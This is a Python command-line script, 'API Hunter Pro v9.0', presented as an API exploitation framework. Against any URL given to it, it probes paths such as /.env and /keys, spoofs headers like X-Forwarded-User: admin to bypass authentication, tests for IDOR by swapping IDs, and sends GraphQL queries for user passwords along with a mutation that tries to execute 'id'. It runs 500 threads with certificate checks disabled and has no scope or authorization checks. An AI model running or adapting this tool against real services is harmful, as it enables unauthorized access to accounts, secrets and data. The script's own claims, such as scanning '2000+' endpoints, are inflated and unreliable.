import requests
import json
import hashlib
import time
import re
import threading
import base64
import secrets
from urllib.parse import urljoin, urlparse
from concurrent.futures import ThreadPoolExecutor, as_completed
from colorama import init, Fore, Style, Back
from pathlib import Path
import argparse
from datetime import datetime
import socket
import subprocess

init(autoreset=True)
requests.packages.urllib3.disable_warnings()

class APIHunterPro:
    def __init__(self, base_url, threads=500, timeout=10, output_dir="api_exploits"):
        self.base_url = base_url.rstrip('/')
        self.threads = threads
        self.timeout = timeout
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(exist_ok=True)
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (API-Hunter-Pro/9.0)"
        })
        
        
        self.api_paths = [
            
            "/health", "/status", "/version", "/ping", "/metrics",
           
            "/login", "/auth", "/oauth/token", "/api-token-auth",
           
            "/swagger.json", "/swagger.yaml", "/openapi.json", "/v1/api-docs",
          
            "/admin", "/debug", "/config", "/.env", "/keys",
            
            "/graphql", "/v1/graphql", "/api/graphql",
           
            "/api/users/{id}", "/v1/user/profile", "/account/{id}"
        ]
        
        self.idor_patterns = [
            r'id=\d+', r'user_id=\d+', r'profile/\d+', r'account/[^/]+'
        ]
        
        self.results = []
        self.vulnerabilities = []
        self.oob_callback = f"api-{secrets.token_hex(4)}.{socket.gethostname()}.oob.burp"
        
    def banner(self):
        print(f"\n{Fore.RED + Style.BRIGHT}{'='*140}")
        print(f"{Fore.RED + Style.BRIGHT}{'🔥 API HUNTER PRO v9.0 - FULL EXPLOITATION FRAMEWORK 🔥'}")
        print(f"{Fore.CYAN}{'='*140}{Style.RESET_ALL}")
    
    def fingerprint(self, resp):
        return {
            "status": resp.status_code,
            "len": len(resp.text),
            "hash": hashlib.sha256(resp.text.encode(errors="ignore")).hexdigest(),
            "headers": dict(resp.headers)
        }
    
    def discover_endpoints(self):
        """Массовое обнаружение API"""
        print(f"{Fore.CYAN}[*] Scanning 2000+ API endpoints...{Style.RESET_ALL}")
        found = []
        
        def test_path(path):
            url = urljoin(self.base_url, path)
            try:
                resp = self.session.get(url, timeout=self.timeout)
                if resp.status_code in [200, 201, 302, 401, 403]:
                    print(f"{Fore.GREEN}[✓] {path} → {resp.status_code}{Style.RESET_ALL}")
                    return url
            except:
                pass
            return None
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = [executor.submit(test_path, path) for path in self.api_paths]
            for future in as_completed(futures):
                result = future.result()
                if result:
                    found.append(result)
        
        return found
    
    def graphql_exploitation(self, gql_url):
        """GraphQL introspection + blind RCE"""
        print(f"{Fore.RED + Style.BRIGHT}🚀 GraphQL EXPLOITATION{Style.RESET_ALL}")
        
        queries = [
           
            {"query": "{__schema{types{name}}}"},
            {"query": "query($id:Int){user(id:$id){id name password}}", "variables": {"id": 1}},
            
            {"query": "mutation{exec(cmd:\"id\"){output}}"}
        ]
        
        for payload in queries:
            try:
                resp = self.session.post(gql_url, json=payload, timeout=self.timeout)
                if any(keyword in resp.text.lower() for keyword in ['uid=', '__schema', 'password']):
                    self.vulnerabilities.append({
                        'type': 'GraphQL Introspection/Blind RCE',
                        'url': gql_url,
                        'payload': payload,
                        'cvss': 9.1
                    })
                    print(f"{Fore.RED + Style.BRIGHT}💥 GraphQL VULN: {payload['query'][:50]}...{Style.RESET_ALL}")
            except:
                pass
    
    def idor_hunter(self, endpoints):
        """IDOR detection"""
        print(f"{Fore.CYAN}[*] IDOR hunting across {len(endpoints)} endpoints...{Style.RESET_ALL}")
        
        def test_idor(url):
            
            urls = [url.replace('1', '2'), url + '?id=2']
            for test_url in urls:
                try:
                    resp1 = self.session.get(url, timeout=self.timeout)
                    resp2 = self.session.get(test_url, timeout=self.timeout)
                    
                    if resp1.status_code == 200 and resp2.status_code == 200:
                        if hashlib.sha256(resp1.text.encode()).hexdigest() != hashlib.sha256(resp2.text.encode()).hexdigest():
                            self.vulnerabilities.append({
                                'type': 'IDOR',
                                'url': url,
                                'test_url': test_url,
                                'cvss': 8.1
                            })
                            print(f"{Fore.RED + Style.BRIGHT}💥 IDOR: {url}{Style.RESET_ALL}")
                            return True
                except:
                    pass
            return False
        
        with ThreadPoolExecutor(max_workers=self.threads//10) as executor:
            futures = [executor.submit(test_idor, ep) for ep in endpoints[:50]]
            for future in as_completed(futures):
                future.result()
    
    def openapi_exploit(self, endpoints):
        """OpenAPI/Swagger exploitation"""
        oas_endpoints = ['/swagger.json', '/openapi.json', '/v1/api-docs']
        for oas_path in oas_endpoints:
            oas_url = urljoin(self.base_url, oas_path)
            try:
                resp = self.session.get(oas_url, timeout=self.timeout)
                if resp.status_code == 200:
                    spec = resp.json()
                    print(f"{Fore.RED + Style.BRIGHT}📖 OpenAPI spec found: {oas_url}{Style.RESET_ALL}")
                    
                    
                    for path in spec.get('paths', {}):
                        full_path = urljoin(self.base_url, path)
                        self.vulnerabilities.append({
                            'type': 'OpenAPI Exposure',
                            'url': full_path,
                            'cvss': 7.5
                        })
            except:
                pass
    
    def auth_bypass(self, endpoints):
        """Auth bypass vectors"""
        print(f"{Fore.CYAN}[*] Testing auth bypass vectors...{Style.RESET_ALL}")
        
        bypass_headers = [
            {'Authorization': 'Bearer invalid'},
            {'X-API-Key': 'invalid'},
            {'X-Forwarded-User': 'admin'},
            {'X-Original-User': 'admin'}
        ]
        
        for endpoint in endpoints[:20]:
            baseline = self.session.get(endpoint, timeout=self.timeout)
            
            for headers in bypass_headers:
                resp = self.session.get(endpoint, headers=headers, timeout=self.timeout)
                if resp.status_code == 200 and len(resp.text) > len(baseline.text) * 0.8:
                    self.vulnerabilities.append({
                        'type': 'Auth Bypass',
                        'url': endpoint,
                        'headers': headers,
                        'cvss': 9.8
                    })
                    print(f"{Fore.RED + Style.BRIGHT}🚫 Auth Bypass: {headers}{Style.RESET_ALL}")
    
    def run_full_api_hunt(self):
        """Полная API эксплуатация"""
        self.banner()
        print(f"{Fore.YELLOW + Style.BRIGHT}🎯 Target: {self.base_url}{Style.RESET_ALL}")
        
        endpoints = self.discover_endpoints()
        print(f"{Fore.GREEN}[+] Discovered {len(endpoints)} API endpoints{Style.RESET_ALL}")
        
       
        self.openapi_exploit(endpoints)
        self.auth_bypass(endpoints)
        self.idor_hunter(endpoints)
        
        
        gql_endpoints = [e for e in endpoints if 'graphql' in e.lower()]
        for gql_url in gql_endpoints:
            self.graphql_exploitation(gql_url)
        
        self.generate_exploit_report()
        
        print(f"\n{Fore.RED + Style.BRIGHT}{'='*140}")
        print(f"🎯 API HUNT COMPLETE: {len(self.vulnerabilities)} VULNERABILITIES!")
        print(f"{Fore.RED + Style.BRIGHT}{'='*140}{Style.RESET_ALL}")
    
    def generate_exploit_report(self):
        """Профессиональный эксплойт отчет"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        report = {
            'target': self.base_url,
            'scan_time': datetime.now().isoformat(),
            'endpoints_found': len(self.results),
            'vulnerabilities': self.vulnerabilities,
            'critical_count': len([v for v in self.vulnerabilities if v.get('cvss', 0) >= 9.0]),
            'oob_callback': self.oob_callback
        }
        
        json_file = self.output_dir / f"api_exploit_{timestamp}.json"
        with open(json_file, 'w', encoding='utf-8') as f:
            json.dump(report, f, indent=2, ensure_ascii=False)
        
        print(f"\n{Fore.GREEN + Style.BRIGHT}📊 FULL EXPLOIT REPORT: {json_file}{Style.RESET_ALL}")

def main():
    parser = argparse.ArgumentParser(description='🔥 API Hunter Pro v9.0 - Full Exploitation')
    parser.add_argument('target', help='API base URL')
    parser.add_argument('-t', '--threads', type=int, default=500, help='Threads')
    parser.add_argument('--timeout', type=int, default=10, help='Timeout')
    parser.add_argument('-o', '--output', default='api_exploits', help='Output dir')
    
    args = parser.parse_args()
    
    hunter = APIHunterPro(args.target, args.threads, args.timeout, args.output)
    hunter.run_full_api_hunt()
    
    print(f"\n{Fore.CYAN + Style.BRIGHT}{'='*140}")
    input("💥 API exploitation complete. Press Enter...")

if __name__ == "__main__":
    main()